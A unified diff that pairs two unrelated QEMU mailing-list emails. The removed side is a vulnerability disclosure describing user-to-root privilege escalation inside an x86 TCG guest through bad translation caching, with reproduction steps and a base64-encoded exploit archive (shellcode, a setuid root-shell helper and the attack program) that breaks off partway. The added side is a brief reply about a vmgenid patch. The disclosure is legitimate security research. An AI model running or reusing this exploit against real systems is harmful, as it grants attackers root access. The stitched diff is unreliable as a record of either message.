@@ -1,23 +1,26 @@
-Received: from eggs.gnu.org ([2001:4830:134:3::10]:47659)
+Received: from eggs.gnu.org ([2001:4830:134:3::10]:48386)
 	by lists.gnu.org with esmtp (Exim 4.71)
-	(envelope-from <jannh@google.com>) id 1cpyRU-0000cy-RP
-	for qemu-devel@nongnu.org; Mon, 20 Mar 2017 10:37:54 -0400
+	(envelope-from <pbonzini@redhat.com>) id 1cpyTL-0001te-9t
+	for qemu-devel@nongnu.org; Mon, 20 Mar 2017 10:39:48 -0400
 Received: from Debian-exim by eggs.gnu.org with spam-scanned (Exim 4.71)
-	(envelope-from <jannh@google.com>) id 1cpyRT-0004F7-I1
-	for qemu-devel@nongnu.org; Mon, 20 Mar 2017 10:37:52 -0400
-Received: from mail-it0-x22c.google.com ([2607:f8b0:4001:c0b::22c]:35754)
-	by eggs.gnu.org with esmtps (TLS1.0:RSA_AES_128_CBC_SHA1:16)
-	(Exim 4.71) (envelope-from <jannh@google.com>) id 1cpyRT-0004F1-99
-	for qemu-devel@nongnu.org; Mon, 20 Mar 2017 10:37:51 -0400
-Received: by mail-it0-x22c.google.com with SMTP id y18so35889771itc.0
-	for <qemu-devel@nongnu.org>; Mon, 20 Mar 2017 07:37:50 -0700 (PDT)
+	(envelope-from <pbonzini@redhat.com>) id 1cpyTI-0004gf-5B
+	for qemu-devel@nongnu.org; Mon, 20 Mar 2017 10:39:47 -0400
+Received: from mx1.redhat.com ([209.132.183.28]:54740)
+	by eggs.gnu.org with esmtps (TLS1.0:DHE_RSA_AES_256_CBC_SHA1:32)
+	(Exim 4.71) (envelope-from <pbonzini@redhat.com>) id 1cpyTH-0004gT-Sy
+	for qemu-devel@nongnu.org; Mon, 20 Mar 2017 10:39:44 -0400
+References: <20170320115951.25345-1-lersek@redhat.com>
+	<20170320115951.25345-2-lersek@redhat.com>
+	<20170320161756-mutt-send-email-mst@kernel.org>
+From: Paolo Bonzini <pbonzini@redhat.com>
+Message-ID: <97c77b4b-61d3-1527-43c1-89d52dcf08f4@redhat.com>
+Date: Mon, 20 Mar 2017 15:39:40 +0100
 MIME-Version: 1.0
-From: Jann Horn <jannh@google.com>
-Date: Mon, 20 Mar 2017 15:36:43 +0100
-Message-ID: <CAG48ez1tcz7GGsc5+L3EF140NsW=UyNir=0UpuZZYrBn4ZxrSA@mail.gmail.com>
-Content-Type: multipart/mixed; boundary=001a114ac834fbdd6d054b2a75f2
-Subject: [Qemu-devel] [BUG] user-to-root privesc inside VM via bad
- translation caching
+In-Reply-To: <20170320161756-mutt-send-email-mst@kernel.org>
+Content-Type: text/plain; charset=windows-1252
+Content-Transfer-Encoding: 7bit
+Subject: Re: [Qemu-devel] [PATCH 1/2] hw/acpi/vmgenid: prevent device
+ realization on pre-2.9 machine types
 List-Id: <qemu-devel.nongnu.org>
 List-Unsubscribe: <https://lists.nongnu.org/mailman/options/qemu-devel>,
 	<mailto:qemu-devel-request@nongnu.org?subject=unsubscribe>
@@ -26,292 +29,101 @@ List-Post: <mailto:qemu-devel@nongnu.org>
 List-Help: <mailto:qemu-devel-request@nongnu.org?subject=help>
 List-Subscribe: <https://lists.nongnu.org/mailman/listinfo/qemu-devel>,
 	<mailto:qemu-devel-request@nongnu.org?subject=subscribe>
-To: Qemu Developers <qemu-devel@nongnu.org>
-
---001a114ac834fbdd6d054b2a75f2
-Content-Type: text/plain; charset=UTF-8
-
-This is an issue in QEMU's system emulation for X86 in TCG mode.
-The issue permits an attacker who can execute code in guest ring 3
-with normal user privileges to inject code into other processes that
-are running in guest ring 3, in particular root-owned processes.
-
-== reproduction steps ==
-
- - Create an x86-64 VM and install Debian Jessie in it. The following
-   steps should all be executed inside the VM.
- - Verify that procmail is installed and the correct version:
-       root@qemuvm:~# apt-cache show procmail | egrep 'Version|SHA'
-       Version: 3.22-24
-       SHA1: 54ed2d51db0e76f027f06068ab5371048c13434c
-       SHA256: 4488cf6975af9134a9b5238d5d70e8be277f70caa45a840dfbefd2dc444bfe7f
- - Install build-essential and nasm ("apt install build-essential nasm").
- - Unpack the exploit, compile it and run it:
-       user@qemuvm:~$ tar xvf procmail_cache_attack.tar
-       procmail_cache_attack/
-       procmail_cache_attack/shellcode.asm
-       procmail_cache_attack/xp.c
-       procmail_cache_attack/compile.sh
-       procmail_cache_attack/attack.c
-       user@qemuvm:~$ cd procmail_cache_attack
-       user@qemuvm:~/procmail_cache_attack$ ./compile.sh
-       user@qemuvm:~/procmail_cache_attack$ ./attack
-       memory mappings set up
-       child is dead, codegen should be complete
-       executing code as root! :)
-       root@qemuvm:~/procmail_cache_attack# id
-       uid=0(root) gid=0(root) groups=0(root),[...]
-
-Note: While the exploit depends on the precise version of procmail,
-the actual vulnerability is in QEMU, not in procmail. procmail merely
-serves as a seldomly-executed setuid root binary into which code can
-be injected.
+To: "Michael S. Tsirkin" <mst@redhat.com>, Laszlo Ersek <lersek@redhat.com>
+Cc: Igor Mammedov <imammedo@redhat.com>, qemu devel list <qemu-devel@nongnu.org>, Ben Warren <ben@skyportsystems.com>
 
 
-== detailed issue description ==
-QEMU caches translated basic blocks. To look up a translated basic
-block, the function tb_find() is used, which uses tb_htable_lookup()
-in its slowpath, which in turn compares translated basic blocks
-(TranslationBlock) to the lookup information (struct tb_desc) using
-tb_cmp().
 
-tb_cmp() attempts to ensure (among other things) that both the virtual
-start address of the basic block and the physical addresses that the
-basic block covers match. When checking the physical addresses, it
-assumes that a basic block can span at most two pages.
+On 20/03/2017 15:19, Michael S. Tsirkin wrote:
+> On Mon, Mar 20, 2017 at 12:59:50PM +0100, Laszlo Ersek wrote:
+>> The WRITE_POINTER linker/loader command that underlies VMGENID depends on
+>> commit baf2d5bfbac0 ("fw-cfg: support writeable blobs", 2017-01-12). That
+>> commit is not available in 2.8.
+>>
+>> Cc: "Michael S. Tsirkin" <mst@redhat.com>
+>> Cc: Ben Warren <ben@skyportsystems.com>
+>> Cc: Igor Mammedov <imammedo@redhat.com>
+>> Signed-off-by: Laszlo Ersek <lersek@redhat.com>
+> 
+> I don't understand why do we want to add code to break this
+> intentionally. What issue does this fix?
 
-gen_intermediate_code() attempts to enforce this by stopping the
-translation of a basic block if nearly one page of instructions has
-been translated already:
+Agreed.  If vmgenid can work with old machine types and new QEMU, it
+should.  For example, when using libvirt machine types identify the
+machine type where the VM was _created_ (unless someone changes it), not
+necessarily the minimal QEMU version that can run it.
 
-    /* if too long translation, stop generation too */
-    if (tcg_op_buf_full() ||
-        (pc_ptr - pc_start) >= (TARGET_PAGE_SIZE - 32) ||
-        num_insns >= max_insns) {
-        gen_jmp_im(pc_ptr - dc->cs_base);
-        gen_eob(dc);
-        break;
-    }
+Paolo
 
-However, while real X86 processors have a maximum instruction length
-of 15 bytes, QEMU's instruction decoder for X86 does not place any
-limit on the instruction length or the number of instruction prefixes.
-Therefore, it is possible to create an arbitrarily long instruction
-by e.g. prepending an arbitrary number of LOCK prefixes to a normal
-instruction. This permits creating a basic block that spans three
-pages by simply appending an approximately page-sized instruction to
-the end of a normal basic block that starts close to the end of a
-page.
-
-Such an overlong basic block causes the basic block caching to fail as
-follows: If code is generated and cached for a basic block that spans
-the physical pages (A,E,B), this basic block will be returned by
-lookups in a process in which the physical pages (A,B,C) are mapped
-in the same virtual address range (assuming that all other lookup
-parameters match).
-
-This behavior can be abused by an attacker e.g. as follows: If a
-non-relocatable world-readable setuid executable legitimately contains
-the pages (A,B,C), an attacker can map (A,E,B) into his own process,
-at the normal load address of A, where E is an attacker-controlled
-page. If a legitimate basic block spans the pages A and B, an attacker
-can write arbitrary non-branch instructions at the start of E, then
-append an overlong instruction
-that ends behind the start of C, yielding a modified basic block that
-spans all three pages. If the attacker then executes the modified
-basic block in his process, the modified basic block is cached.
-Next, the attacker can execute the setuid binary, which will reuse the
-cached modified basic block, executing attacker-controlled
-instructions in the context of the privileged process.
-
-I am sending this to qemu-devel because a QEMU security contact
-told me that QEMU does not consider privilege escalation inside a
-TCG VM to be a security concern.
-
---001a114ac834fbdd6d054b2a75f2
-Content-Type: application/x-tar; name="procmail_cache_attack.tar"
-Content-Disposition: attachment; filename="procmail_cache_attack.tar"
-Content-Transfer-Encoding: base64
-X-Attachment-Id: f_j0i7nmgv0
-
-cHJvY21haWxfY2FjaGVfYXR0YWNrLwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAwMDA3NTUAMDAwMTc1
-MAAwMDAxNzUwADAwMDAwMDAwMDAwADEzMDQ3MTc2NTUwADAxNDA2NAAgNQAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB1c3RhciAgAHVzZXIAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAdXNlcgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABw
-cm9jbWFpbF9jYWNoZV9hdHRhY2svc2hlbGxjb2RlLmFzbQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMDAwMDY0NAAwMDAxNzUw
-ADAwMDE3NTAAMDAwMDAwMDA3NjQAMTMwNDcxNzMyNTQAMDE2NTM1ACAwAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHVzdGFyICAAdXNlcgAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAB1c2VyAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGJp
-dHMgNjQKCnN0YXJ0OgoKOyByZXR1cm4gYWRkcmVzczogZXhlY2wKbW92IHI4LCAweDEwMDAxMDAw
-MTAwMDExMTEgOyBMSUJDX1NUQVJUX01BSU5fR09UX0FERFIKbW92IHI4LCBbcjhdIDsgX19saWJj
-X3N0YXJ0X21haW4KbW92IHI5LCAweDIwMDAyMDAwMjAwMDIyMjIgOyBFWEVDTF9PRkZTRVQKYWRk
-IHI4LCByOSA7IGV4ZWNsCm1vdiBbcnNwXSwgcjgKCjsgd3JpdGUgIi90bXAveHBcMCIgdG8gc3Rh
-Y2sKbGVhIHJkaSwgW3JzcCArIDB4MTAwXQptb3YgZHdvcmQgW3JkaSswXSwgMHg3MDZkNzQyZiAK
-bW92IGR3b3JkIFtyZGkrNF0sIDB4MDA3MDc4MmYKCjsgc2V0IHVwIGFyZ3MKOyBleGVjbChyZGk9
-Ii90bXAveHAiLCByc2k9Ii90bXAveHAiLCByZHg9TlVMTCkKbW92IHJzaSwgcmRpCm1vdiByZHgs
-IDAKbW92IHJheCwgMCA7IHNwZWNpYWwgY2FzZSBpbiB0aGUgY2FsbGluZyBjb252ZW50aW9uIGZv
-ciB2YXJhcmcgZnVuY3Rpb25zCgphbGlnbiAweDEwMDAsIGRiIDB4ZjAKAAAAAAAAAAAAAAAAcHJv
-Y21haWxfY2FjaGVfYXR0YWNrL3hwLmMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAwMDA2NDQAMDAwMTc1MAAw
-MDAxNzUwADAwMDAwMDAwNzAzADEzMDQ3MTczNzM0ADAxNDY2MAAgMAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB1c3RhciAgAHVzZXIAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAdXNlcgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAjaW5j
-bHVkZSA8c3RkaW8uaD4KI2luY2x1ZGUgPHVuaXN0ZC5oPgojaW5jbHVkZSA8c3lzL3R5cGVzLmg+
-CiNpbmNsdWRlIDxzeXMvc3RhdC5oPgojaW5jbHVkZSA8ZmNudGwuaD4KI2luY2x1ZGUgPGVyci5o
-PgoKaW50IG1haW4odm9pZCkgewogIC8vIGZpeCB1cCBzdGFuZGFyZCBpbnB1dC9vdXRwdXQKICBj
-bG9zZSgwKTsKICBjbG9zZSgxKTsKICBjbG9zZSgyKTsKICBvcGVuKCIvZGV2L3R0eSIsIE9fUkRX
-Uik7CiAgb3BlbigiL2Rldi90dHkiLCBPX1JEV1IpOwogIG9wZW4oIi9kZXYvdHR5IiwgT19SRFdS
-KTsKCiAgaWYgKHNldHVpZCgwKSB8fCBzZXRnaWQoMCkpCiAgICBlcnIoMSwgInNldHVpZC9zZXRn
-aWQgZmFpbGVkIik7CiAgcHV0cygiZXhlY3V0aW5nIGNvZGUgYXMgcm9vdCEgOikiKTsKICBleGVj
-bHAoImJhc2giLCAiYmFzaCIsIE5VTEwpOwogIGVycigxLCAiZXhlY2xwIik7Cn0KAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHByb2Nt
-YWlsX2NhY2hlX2F0dGFjay9jb21waWxlLnNoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwMDAwNzU1ADAwMDE3NTAAMDAw
-MTc1MAAwMDAwMDAwMDEzNwAxMzA0NzE3MzcxMgAwMTYwNTEAIDAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdXN0YXIgIAB1c2VyAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAHVzZXIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIyEvYmlu
-L3NoCm5hc20gc2hlbGxjb2RlLmFzbQpnY2MgLW8gYXR0YWNrIGF0dGFjay5jIC1mcGllIC1waWUg
-LVdhbGwgLWxkbApnY2MgLW8geHAgeHAuYyAtV2FsbAoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABwcm9jbWFp
-bF9jYWNoZV9hdHRhY2svYXR0YWNrLmMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMDAwMDY0NAAwMDAxNzUwADAwMDE3
-NTAAMDAwMDAwMTExMDUAMTMwNDcxNzY1NTAAMDE1NDc1ACAwAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAHVzdGFyICAAdXNlcgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAB1c2VyAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACNkZWZpbmUg
-X0dOVV9TT1VSQ0UKI2luY2x1ZGUgPHN0ZGludC5oPgojaW5jbHVkZSA8c3RkbGliLmg+CiNpbmNs
-dWRlIDxzdGRpby5oPgojaW5jbHVkZSA8c3lzL21tYW4uaD4KI2luY2x1ZGUgPHN5cy90eXBlcy5o
-PgojaW5jbHVkZSA8c3lzL3N0YXQuaD4KI2luY2x1ZGUgPGZjbnRsLmg+CiNpbmNsdWRlIDxlcnIu
-aD4KI2luY2x1ZGUgPHVuaXN0ZC5oPgojaW5jbHVkZSA8ZGxmY24uaD4KI2luY2x1ZGUgPHN0cmlu
-Zy5oPgojaW5jbHVkZSA8c3lzL3dhaXQuaD4KCiNkZWZpbmUgVEFSR0VUICIvdXNyL2Jpbi9wcm9j
-bWFpbCIKI2RlZmluZSBUQVJHRVRfTE9BRF9BRERSIDB4NDAwMDAwCiNkZWZpbmUgQ09ERV9TVEFS
-VF9PRkZTRVQgMHgzZmZiCiNkZWZpbmUgRVZJTF9QQUdFX09GRlNFVCAweDQwMDAKI2RlZmluZSBI
-QVJNTEVTU19DT0RFX0NBUlJZT1ZFUiAyCiNkZWZpbmUgTElCQ19TVEFSVF9NQUlOX0dPVF9BRERS
-IDB4NjE1MTYwCiNkZWZpbmUgQkFTSUNfQkxPQ0tfU1RBUlQgMHg0MDNmZmIKCnZvaWQgKm1tYXBf
-ZmlsZSh2b2lkICphZGRyLCBjaGFyICpwYXRoLCBzaXplX3Qgc2l6ZSwgb2ZmX3Qgb2Zmc2V0KSB7
-CglpbnQgZmQgPSBvcGVuKHBhdGgsIE9fUkRPTkxZKTsKCWlmIChmZCA9PSAtMSkKCQllcnIoMSwg
-Im9wZW4gJXMiLCBwYXRoKTsKCXZvaWQgKm1hcHBpbmcgPSBtbWFwKGFkZHIsIHNpemUsIFBST1Rf
-UkVBRHxQUk9UX0VYRUMsIE1BUF9TSEFSRUR8TUFQX0xPQ0tFRHwoYWRkcj9NQVBfRklYRUQ6MCks
-IGZkLCBvZmZzZXQpOwoJaWYgKG1hcHBpbmcgPT0gTUFQX0ZBSUxFRCkKCQllcnIoMSwgIm1tYXAi
-KTsKCWNsb3NlKGZkKTsKCXJldHVybiBtYXBwaW5nOwp9Cgp2b2lkICpmaXh1cF9sb2MoY2hhciAq
-YnVmLCBzaXplX3QgYnVmbGVuLCB1aW50NjRfdCBuZWVkbGVfLCBzaXplX3QgbmVlZGxlX2xlbikg
-ewoJY2hhciBuZWVkbGVbOF07CglpZiAobmVlZGxlX2xlbiA9PSA4KQoJCSoodWludDY0X3QqKW5l
-ZWRsZSA9IG5lZWRsZV87CgllbHNlIGlmIChuZWVkbGVfbGVuID09IDQpCgkJKih1aW50MzJfdCop
-bmVlZGxlID0gbmVlZGxlXzsKCWVsc2UKCQllcnJ4KDEsICJuZWVkbGVfbGVuIHdlaXJkIik7Cglj
-aGFyICpsb2MgPSBtZW1tZW0oYnVmLCBidWZsZW4sIG5lZWRsZSwgbmVlZGxlX2xlbik7CglpZiAo
-bG9jID09IE5VTEwpCgkJZXJyeCgxLCAiZml4dXBfbG9jOiBjYW4ndCBmaW5kIG5lZWRsZSIpOwoJ
-aWYgKG1lbW1lbShsb2MgKyAxLCBidWZsZW4gLSAxIC0gKGxvYyAtIGJ1ZiksIG5lZWRsZSwgbmVl
-ZGxlX2xlbikgIT0gTlVMTCkKCQllcnJ4KDEsICJmaXh1cF9sb2M6IGR1cGxpY2F0ZSBuZWVkbGUi
-KTsKCXJldHVybiBsb2M7Cn0KCmludCBtYWluKHZvaWQpIHsKCXN5c3RlbSgiY3AgeHAgL3RtcC94
-cCIpOwoKCWxvbmcgZXhlY2xfb2Zmc2V0ID0gKChjaGFyKilkbHN5bShSVExEX0RFRkFVTFQsICJl
-eGVjbCIpKSAtICgoY2hhciopZGxzeW0oUlRMRF9ERUZBVUxULCAiX19saWJjX3N0YXJ0X21haW4i
-KSk7CgoJaW50IHRhcmdldF9mZCA9IG9wZW4oVEFSR0VULCBPX1JET05MWSk7CglpZiAodGFyZ2V0
-X2ZkID09IC0xKQoJCWVycigxLCAib3BlbiIpOwoJY2hhciAqbG9hZF9hZGRyID0gKGNoYXIqKShU
-QVJHRVRfTE9BRF9BRERSICsgRVZJTF9QQUdFX09GRlNFVCAtIDB4MTAwMCk7CgljaGFyICp0YXJn
-ZXRfbWFwcGluZyA9IG1tYXAobG9hZF9hZGRyLCAweDMwMDAsIFBST1RfUkVBRHxQUk9UX0VYRUMs
-CgkJTUFQX1NIQVJFRHxNQVBfTE9DS0VELCB0YXJnZXRfZmQsIEVWSUxfUEFHRV9PRkZTRVQgLSAw
-eDEwMDApOwoJaWYgKHRhcmdldF9tYXBwaW5nICE9IGxvYWRfYWRkcikgewoJCWlmICh0YXJnZXRf
-bWFwcGluZyA9PSBNQVBfRkFJTEVEKQoJCQllcnIoMSwgIm1tYXAiKTsKCQllbHNlCgkJCWVycngo
-MSwgIm1hcHBpbmcgY29sbGlzaW9uIik7Cgl9CgoJLy8gbW92ZSBsZWdpdGltYXRlIHBhZ2UgQgoJ
-aWYgKG1yZW1hcChsb2FkX2FkZHIrMHgxMDAwLCAweDEwMDAsIDB4MTAwMCwgTVJFTUFQX01BWU1P
-VkV8TVJFTUFQX0ZJWEVELCBsb2FkX2FkZHIrMHgyMDAwKSAhPSBsb2FkX2FkZHIrMHgyMDAwKQoJ
-CWVycigxLCAibXJlbWFwIik7CgoJLy8gcGxhY2UgZXZpbCBzaGVsbGNvZGUgcGFnZSBiZXR3ZWVu
-IHBhZ2VzIEEgYW5kIEIKCWludCBzaGVsbGNvZGVfZmQgPSBvcGVuKCJzaGVsbGNvZGUiLCBPX1JE
-T05MWSk7CglpZiAoc2hlbGxjb2RlX2ZkID09IC0xKQoJCWVycigxLCAib3BlbiIpOwoJY2hhciAq
-c2hlbGxjb2RlID0gbG9hZF9hZGRyKzB4MTAwMDsKCWlmIChtbWFwKHNoZWxsY29kZSwgMHgxMDAw
-LCBQUk9UX1JFQUR8UFJPVF9XUklURXxQUk9UX0VYRUMsIE1BUF9QUklWQVRFfE1BUF9GSVhFRCwg
-c2hlbGxjb2RlX2ZkLCAwKSAhPSBzaGVsbGNvZGUpCgkJZXJyKDEsICJtbWFwIik7CgoJLy8gZml4
-IHVwIHN0dWZmIGluIHRoZSBzaGVsbGNvZGUKCXVpbnQ2NF90ICpsaWJjX3N0YXJ0X21haW5fZ290
-X2FkZHJfbG9jID0gZml4dXBfbG9jKHNoZWxsY29kZSwgMHgxMDAwLCAweDEwMDAxMDAwMTAwMDEx
-MTEsIDgpOwoJdWludDY0X3QgKmV4ZWNsX29mZnNldF9sb2MgPSBmaXh1cF9sb2Moc2hlbGxjb2Rl
-LCAweDEwMDAsIDB4MjAwMDIwMDAyMDAwMjIyMiwgOCk7CgkqbGliY19zdGFydF9tYWluX2dvdF9h
-ZGRyX2xvYyA9IExJQkNfU1RBUlRfTUFJTl9HT1RfQUREUjsKCSpleGVjbF9vZmZzZXRfbG9jID0g
-KHVpbnQ2NF90KWV4ZWNsX29mZnNldDsKCgkvLyBjb21wbGV0ZSBpbnN0cnVjdGlvbiBhdCBlbmQg
-b2YgcGFnZSBBIHVzaW5nIHN0YXJ0IG9mIHBhZ2UgQgoJbWVtbW92ZShzaGVsbGNvZGUgKyBIQVJN
-TEVTU19DT0RFX0NBUlJZT1ZFUiwgc2hlbGxjb2RlLCAweDEwMDAgLSBIQVJNTEVTU19DT0RFX0NB
-UlJZT1ZFUik7CgltZW1jcHkoc2hlbGxjb2RlLCBzaGVsbGNvZGUrMHgxMDAwLCBIQVJNTEVTU19D
-T0RFX0NBUlJZT1ZFUik7CgoJLy8gcGxhY2Ugb3Bjb2RlIGZvciAicmV0IGltbTE2IiBhdCBlbmQg
-b2Ygc2hlbGxjb2RlIHBhZ2U7IGltbWVkaWF0ZSBkb2Vzbid0IG1hdHRlciBhbmQgY29tZXMgZnJv
-bSBwYWdlIEIKCXNoZWxsY29kZVsweGZmZl0gPSAweGMyOwoKCS8vIHByb3RlY3Qgc2hlbGxjb2Rl
-IHBhZ2Ugc28gdGhlIGNvcGllZCBpbnN0cnVjdGlvbiBjYW4ndCBhY2NpZGVudGFsbHkgY2xvYmJl
-ciB0aGUgc2hlbGxjb2RlIG9yIHdoYXRldmVyCglpZiAobXByb3RlY3Qoc2hlbGxjb2RlLCAweDEw
-MDAsIFBST1RfUkVBRHxQUk9UX0VYRUMpKQoJCWVycigxLCAibXByb3RlY3QiKTsKCglwdXRzKCJt
-ZW1vcnkgbWFwcGluZ3Mgc2V0IHVwIik7CgoJLy8gZG8gY29kZWdlbiBpbiBjaGlsZDsgY2hpbGQg
-aXMgZ29pbmcgdG8gZ28gd2lsZCBiZWNhdXNlIG9mIHRoZSBjb3BpZWQgaW5zdHJ1Y3Rpb24sIHdo
-YXRldmVyCglwaWRfdCBjaGlsZCA9IGZvcmsoKTsKCWlmIChjaGlsZCA9PSAtMSkKCQllcnIoMSwg
-ImZvcmsiKTsKCWlmIChjaGlsZCA9PSAwKSB7CgkJLy8gcHJvY21haWwgcnVucyB3aXRoIENSMC5U
-Uz0wLiBiZWNhdXNlIENSMC5UUyBpcyBhIGZsYWcgdXNlZCB0byBmaWx0ZXIgY2FjaGVkCgkJLy8g
-Y29kZSwgd2UgbmVlZCB0byBlbnN1cmUgdGhhdCBvdXIgQ1IwLlRTIGlzIGFsc28gMC4KCQlhc20g
-dm9sYXRpbGUoImZuaW5pdCIpOwoKCQkoKHZvaWQoKikodm9pZCkpQkFTSUNfQkxPQ0tfU1RBUlQp
-KCk7CgkJcmV0dXJuIDA7IC8qIHZlcnkgdW5saWtlbHkgdG8gYWN0dWFsbHkgYmUgcmVhY2hlZCwg
-YnV0IHdoYXRldmVyICovCgl9CgoJLy8gd2FpdCBmb3IgdGhlIGNoaWxkIHRvIGdlbmVyYXRlIGNv
-ZGUsIHRoZW4gaW1tZWRpYXRlbHkgZGllIG1lc3NpbHkKCWludCBzdGF0dXM7CglpZiAod2FpdCgm
-c3RhdHVzKSAhPSBjaGlsZCkKCQllcnIoMSwgInVuYWJsZSB0byB3YWl0IGZvciBjaGlsZCIpOwoK
-CXByaW50ZigiY2hpbGQgaXMgZGVhZCwgY29kZWdlbiBzaG91bGQgYmUgY29tcGxldGVcbiIpOwoK
-CS8vIG9rYXkhIG5vdyBsYXVuY2ggdGhlIHRhcmdldC4gaW4gYSBzdWJwcm9jZXNzLCBiZWNhdXNl
